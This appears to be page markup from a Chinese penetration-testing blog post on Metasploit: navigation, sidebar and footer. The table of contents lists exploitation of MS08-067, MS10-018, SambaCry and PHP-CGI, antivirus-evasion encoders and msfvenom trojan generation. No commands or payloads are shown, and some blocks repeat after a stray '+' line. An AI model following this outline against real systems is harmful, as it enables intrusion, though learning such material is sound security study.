编码器（免杀编码）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Nops-%E7%A9%BA%E6%8C%87%E4%BB%A4%E6%A8%A1%E5%9D%97%EF%BC%88NOP%E7%94%9F%E6%88%90%E5%99%A8%EF%BC%89"><span class="toc-text">5. Nops 空指令模块（NOP生成器）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Post-%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="toc-text">6. Post 后渗透模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81MSF%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-text">二、MSF控制台基础命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-msfconsole"><span class="toc-text">1. msfconsole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%EF%BC%9F"><span class="toc-text">2. ？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-search"><span class="toc-text">3. search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-use"><span class="toc-text">4. use</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-exit"><span class="toc-text">5. exit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81MSF-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-text">三、MSF 渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-MS08-067"><span class="toc-text">(一) MS08-067</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%AE%80%E4%BB%8B"><span class="toc-text">1. 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B1%87%E6%80%BB"><span class="toc-text">2. 命令行汇总</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-text">3. 攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1"><span class="toc-text">4. 防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-MS10-018-IE%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-text">(二) MS10-018 IE浏览器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%AE%80%E4%BB%8B-1"><span class="toc-text">1. 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B1%87%E6%80%BB-1"><span class="toc-text">2. 命令行汇总</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-1"><span class="toc-text">3. 攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1-1"><span class="toc-text">4. 防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-CVE-2017-7494-SambaCry%EF%BC%88Linux%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89"><span class="toc-text">(三) CVE-2017-7494 SambaCry（Linux永恒之蓝）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%AE%80%E4%BB%8B-2"><span class="toc-text">1. 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B1%87%E6%80%BB-2"><span class="toc-text">2. 命令行汇总</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-2"><span class="toc-text">3. 攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1-2"><span class="toc-text">4. 防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-CVE-2012-1823%EF%BC%88PHP-CGI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-text">(四) CVE-2012-1823（PHP CGI漏洞利用）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%AE%80%E4%BB%8B-3"><span class="toc-text">1. 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B1%87%E6%80%BB-3"><span class="toc-text">2. 命令行汇总</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-3"><span class="toc-text">3. 攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1-3"><span class="toc-text">4. 防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-msfvenom-%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC"><span class="toc-text">(五) msfvenom 生成后门木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Msfvenom-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">1. Msfvenom 是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">2. 使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A0%B8%E5%BF%83%E5%8F%82%E6%95%B0"><span class="toc-text">3. 核心参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-text">4. 基础语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Windows%E6%9C%A8%E9%A9%AC%E7%A4%BA%E4%BE%8B"><span class="toc-text">5. Windows木马示例</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/" title="MSF的使用以及漏洞复现">MSF的使用以及漏洞复现</a><time datetime="2026-07-11T04:00:00.000Z" title="发表于 2026-07-11 12:00:00">2026-07-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/30/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%B8%8E%E5%91%BD%E4%BB%A4%E7%88%86%E7%A0%B4/index/" title="弱口令与命令爆破">弱口令与命令爆破</a><time datetime="2026-06-30T15:08:00.000Z" title="发表于 2026-06-30 23:08:00">2026-06-30</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Jasmine_Iris</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"><script>(() => {
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/MSF/">MSF</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post-share"><div class="social-share" data-image="/img/photo.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/06/30/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%B8%8E%E5%91%BD%E4%BB%A4%E7%88%86%E7%A0%B4/index/" title="弱口令与命令爆破"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">弱口令与命令爆破</div></div><div class="info-2"><div class="info-item-1">弱口令定义与危害、密码字典生成（通用模式+社工定制）、Burp Suite四种爆破模式详解、Hydra多协议破解实战（SSH/RDP/MySQL/HTTP表单）</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index/" title="SQL注入漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-23</div><div class="info-item-2">SQL注入漏洞</div></div><div class="info-2"><div class="info-item-1">SQL注入漏洞的原理、分类（联合/报错/布尔/时间盲注）、常见绕过技巧与防御方法</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jasmine_Iris</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Jasmineee007"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Jasmineee007" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客~ 📝<br/><hr/>最近更新：2026-07-11<br/><br/>最新文章：<br/><a href="/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/">MSF的使用以及漏洞复现</a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">MSF 是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0"><span class="toc-text">基础概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E7%9B%AE%E5%BD%95%E5%88%86%E5%B7%A5"><span class="toc-text">核心目录分工</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#modules%E5%85%AD%E5%A4%A7%E5%AD%90%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-text">modules六大子模块详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Auxiliary-%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97"><span class="toc-text">Auxiliary 辅助模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploits-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97%EF%BC%88EXP%EF%BC%89"><span class="toc-text">Exploits 漏洞利用模块（EXP）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payloads-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%EF%BC%88Shellcode%EF%BC%89"><span class="toc-text">Payloads 攻击载荷（Shellcode）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encoders-%E7%BC%96%E7%A0%81%E5%99%A8%EF%BC%88%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81%EF%BC%89"><span class="toc-text">Encoders 编码器（免杀编码）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nops-%E7%A9%BA%E6%8C%87%E4%BB%A4%E6%A8%A1%E5%9D%97%EF%BC%88NOP%E7%94%9F%E6%88%90%E5%99%A8%EF%BC%89"><span class="toc-text">Nops 空指令模块（NOP生成器）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Post-%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="toc-text">Post 后渗透模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-text">MSF控制台基础命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-text">MSF 渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MS08-067"><span class="toc-text">MS08-067</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B1%87%E6%80%BB"><span class="toc-text">命令行汇总</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS10-018-IE%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-text">MS10-018 IE浏览器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B1%87%E6%80%BB-1"><span class="toc-text">命令行汇总</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-1"><span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-7494-SambaCry%EF%BC%88Linux%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89"><span class="toc-text">CVE-2017-7494 SambaCry（Linux永恒之蓝）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-2"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B1%87%E6%80%BB-2"><span class="toc-text">命令行汇总</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-2"><span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-2"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2012-1823%EF%BC%88PHP-CGI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-text">CVE-2012-1823（PHP CGI漏洞利用）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-3"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B1%87%E6%80%BB-3"><span class="toc-text">命令行汇总</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-3"><span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-3"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msfvenom-%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC"><span class="toc-text">msfvenom 生成后门木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Msfvenom-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">Msfvenom 是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8F%82%E6%95%B0"><span class="toc-text">核心参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-text">基础语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E6%9C%A8%E9%A9%AC%E7%A4%BA%E4%BE%8B"><span class="toc-text">Windows木马示例</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/" title="MSF的使用以及漏洞复现">MSF的使用以及漏洞复现</a><time datetime="2026-07-11T04:00:00.000Z" title="发表于 2026-07-11 12:00:00">2026-07-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/30/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%B8%8E%E5%91%BD%E4%BB%A4%E7%88%86%E7%A0%B4/index/" title="弱口令与命令爆破">弱口令与命令爆破</a><time datetime="2026-06-30T15:08:00.000Z" title="发表于 2026-06-30 23:08:00">2026-06-30</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Jasmine_Iris</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"><script>(() => {
   let initFn = window.walineFn || null
   const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
   const option = null
